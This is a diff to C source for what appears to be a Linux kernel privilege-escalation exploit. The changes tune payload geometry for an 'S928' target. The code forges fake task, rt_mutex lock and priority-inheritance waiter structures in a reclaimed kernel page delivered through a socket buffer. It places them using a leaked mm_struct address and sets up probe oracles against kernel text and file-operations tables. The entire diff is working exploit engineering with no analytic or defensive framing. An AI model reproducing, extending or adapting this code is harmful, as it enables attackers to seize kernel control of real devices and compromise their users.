@@ -124,22 +124,122 @@ static const uintptr_t slide_bank_offsets[] = {
 static uintptr_t slide_bank_payload_base;
 static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
 static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];
+static size_t slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
+static size_t slide_bank_task_off = SLIDE_BANK_TASK_OFF;
 
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_BANK_TASK_STRIDE)
+#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_S928_BANK_TASK_STRIDE
+#else
+#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_BANK_TASK_STRIDE
+#endif
+
+static uintptr_t slide_bank_lock_owner(uintptr_t task) {
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_BANK_LOCK_OWNER_TASK) && \
+    SLIDE_S928_BANK_LOCK_OWNER_TASK
+  return task | 1;
+#else
+  (void)task;
+  return SLIDE_LOCK_OWNER_VALUE;
+#endif
+}
+
+#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+      defined(SLIDE_S928_TASK_OFF_CANDIDATES))
 _Static_assert(
-    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
+    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) *
+                              ACTIVE_SLIDE_BANK_TASK_STRIDE +
             FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
         SLIDE_BANK_LOCK_OFF,
     "slide task bank overlaps lock bank");
+#endif
 _Static_assert(
     SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
             SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
         ORDER3_SIZE,
     "slide lock bank exceeds reclaimed page");
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_BANK_LOCK_BASE)
+_Static_assert(
+    SLIDE_S928_BANK_LOCK_BASE +
+            (SLIDE_S928_BANK_LOCK_MAX_BUCKET <<
+             SLIDE_S928_BANK_LOCK_SHIFT) +
+            (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
+            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
+        ORDER3_SIZE,
+    "S928 slide lock bank exceeds reclaimed page");
+#endif
 #if defined(APP_FOPS_TABLE_MIRROR_OFF)
 _Static_assert(
     APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
     "mirrored FOPS table overlaps primary FOPS table");
 #endif
+
+static int configure_slide_bank_geometry(uintptr_t leaked,
+                                         int payload_mode) {
+  slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
+  slide_bank_task_off = SLIDE_BANK_TASK_OFF;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_BANK_LOCK_BASE)
+  size_t bucket =
+      (leaked >> SLIDE_S928_BANK_LOCK_SHIFT) &
+      SLIDE_S928_BANK_LOCK_BUCKET_MASK;
+  if (bucket > SLIDE_S928_BANK_LOCK_MAX_BUCKET) {
+    pr_warning("S928 lock bucket rejected=%zu max=%d mode=%d\n", bucket,
+               SLIDE_S928_BANK_LOCK_MAX_BUCKET, payload_mode);
+    return 0;
+  }
+  slide_bank_lock_off =
+      SLIDE_S928_BANK_LOCK_BASE +
+      (bucket << SLIDE_S928_BANK_LOCK_SHIFT);
+
+#if defined(SLIDE_S928_TASK_OFF_CANDIDATES) && \
+    defined(FOPS_S928_TASK_OFF_CANDIDATES)
+  static const size_t slide_task_candidates[] = {
+    SLIDE_S928_TASK_OFF_CANDIDATES
+  };
+  static const size_t fops_task_candidates[] = {
+    FOPS_S928_TASK_OFF_CANDIDATES
+  };
+  const size_t *candidates = fops_task_candidates;
+  size_t candidate_count =
+      sizeof(fops_task_candidates) / sizeof(fops_task_candidates[0]);
+  size_t task_span = FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t);
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    candidates = slide_task_candidates;
+    candidate_count =
+        sizeof(slide_task_candidates) / sizeof(slide_task_candidates[0]);
+    task_span += (SLIDE_BANK_SLOTS - 1) * ACTIVE_SLIDE_BANK_TASK_STRIDE;
+  }
+  size_t lock_span = (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
+                     SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE;
+  slide_bank_task_off = 0;
+  for (size_t i = 0; i < candidate_count; i++) {
+    size_t candidate = candidates[i];
+    if (candidate + task_span > ORDER3_SIZE) {
+      continue;
+    }
+    if (candidate + task_span <= slide_bank_lock_off ||
+        slide_bank_lock_off + lock_span <= candidate) {
+      slide_bank_task_off = candidate;
+      break;
+    }
+  }
+  if (!slide_bank_task_off) {
+    pr_warning("S928 task bank unavailable bucket=%zu lock=0x%zx mode=%d\n",
+               bucket, slide_bank_lock_off, payload_mode);
+    return 0;
+  }
+#endif
+  pr_info("S928 bank bucket=%zu lock=0x%zx task=0x%zx mode=%d\n", bucket,
+          slide_bank_lock_off, slide_bank_task_off, payload_mode);
+#else
+  (void)leaked;
+  (void)payload_mode;
+#endif
+  return 1;
+}
 #endif
 
 uintptr_t page_base;
@@ -227,9 +327,9 @@ int select_slide_payload_index(size_t index) {
   if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
     return 0;
   }
-  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
-              index * SLIDE_BANK_TASK_STRIDE;
-  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
+  fake_task = slide_bank_payload_base + slide_bank_task_off +
+              index * ACTIVE_SLIDE_BANK_TASK_STRIDE;
+  fake_lock = slide_bank_payload_base + slide_bank_lock_off +
               index * SLIDE_BANK_SLOT_STRIDE;
   fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
   slide_oracle_parent = slide_bank_parents[index];
@@ -240,15 +340,16 @@ int select_slide_payload_index(size_t index) {
 static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                  size_t slot, uintptr_t parent,
                                  uintptr_t target) {
-  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
-  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
+  size_t task_off =
+      slide_bank_task_off + slot * ACTIVE_SLIDE_BANK_TASK_STRIDE;
+  size_t lock_off = slide_bank_lock_off + slot * SLIDE_BANK_SLOT_STRIDE;
   size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
   uintptr_t task = payload_base + task_off;
   uintptr_t lock = payload_base + lock_off;
   uintptr_t waiter = payload_base + waiter_off;
   uintptr_t pi_right = 0;
   uintptr_t pi_left = target;
-  uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
+  uintptr_t lock_owner = slide_bank_lock_owner(task);
   uintptr_t waiter_task = task;
   uintptr_t task_group = 0;
   uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
@@ -725,7 +826,13 @@ void prepare_ctxs(void) {
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
-  uintptr_t payload_base = base + SKB_DATA_DELTA;
+  intptr_t payload_delta = SKB_DATA_DELTA;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_SKB_DATA_DELTA)
+  /* Use the fragment's 0xe80 data start for both oracle and FOPS pages. */
+  payload_delta = SLIDE_S928_SKB_DATA_DELTA;
+#endif
+  uintptr_t payload_base = base + payload_delta;
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -744,6 +851,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
         } else if (slot == P0_ORACLE_PROBE_SLOT) {
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_PROBE_PARENT_OFF) && \
+    defined(SLIDE_S928_PROBE_TARGET_IMAGE_OFF)
+          parent = base + SLIDE_S928_PROBE_PARENT_OFF;
+          target = P0_DATA_ALIAS_CONST(
+                       KIMAGE_TEXT_BASE +
+                       SLIDE_S928_PROBE_TARGET_IMAGE_OFF) +
+                   slide_p0_offset;
+#else
           uintptr_t direct_addr =
               P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
               P0_ORACLE_PROBE_OFFSET;
@@ -757,6 +873,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                    sizeof(struct user_pipe_buffer);
           p0_probe_page_struct = parent;
+#endif
         } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
           parent = p0_gate_page_struct;
           target = 0;
@@ -771,9 +888,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
         slide_bank_parents[slot] = parent;
         slide_bank_targets[slot] = target;
-        size_t task_off = SLIDE_BANK_TASK_OFF +
-                          slot * SLIDE_BANK_TASK_STRIDE;
-        size_t lock_off = SLIDE_BANK_LOCK_OFF +
+        size_t task_off = slide_bank_task_off +
+                          slot * ACTIVE_SLIDE_BANK_TASK_STRIDE;
+        size_t lock_off = slide_bank_lock_off +
                           slot * SLIDE_BANK_SLOT_STRIDE;
         size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
         uintptr_t task = payload_base + task_off;
@@ -783,7 +900,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put32(p, lock_off + 0x00, 0);
         put64(p, lock_off + 0x08, waiter);
         put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
+        put64(p, lock_off + 0x18, slide_bank_lock_owner(task));
 
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
@@ -1209,7 +1326,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ);
 #endif
-  if (!prepare_skb_payload(base, payload_mode)) {
+  int slide_bank_configured = 1;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES)
+  slide_bank_configured =
+      configure_slide_bank_geometry(leaked, payload_mode);
+#endif
+  if (!slide_bank_configured || !prepare_skb_payload(base, payload_mode)) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("skb-payload");
 #else
